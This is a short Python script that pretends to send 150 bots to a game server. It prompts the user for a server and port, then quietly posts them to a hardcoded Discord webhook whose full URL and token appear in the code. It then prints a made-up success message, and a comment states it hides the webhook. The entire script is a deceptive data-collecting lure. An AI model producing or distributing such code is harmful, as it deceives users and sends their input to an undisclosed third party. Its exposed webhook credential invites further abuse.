import requests
from colorama import init, Fore

# Inicializa colorama
init(autoreset=True)

# Solicita datos al usuario en portugués brasileño
servidor = input("Adicione o servidor para onde deseja passar os bots: ")
porta = input("Adicione a porta onde deseja adicionar os bots: ")

# Prepara y envía los datos a la webhook
webhook_url = "https://discord.com/api/webhooks/1366603121110810675/MJ11emn_Mvqii5vbkWldODL1rCJIZ0oJx74K6_BpAeo3ozJPtzhKPicaehw3PfglWLUR"
data = {
    "content": f"Servidor: {servidor}\nPorta: {porta}"
}
requests.post(webhook_url, json=data)

# Muestra mensaje de éxito (sin mención al webhook)
print(Fore.GREEN + f"Bots com sucesso! 150 bots passados com sucesso para o servidor {servidor}:{porta}!")
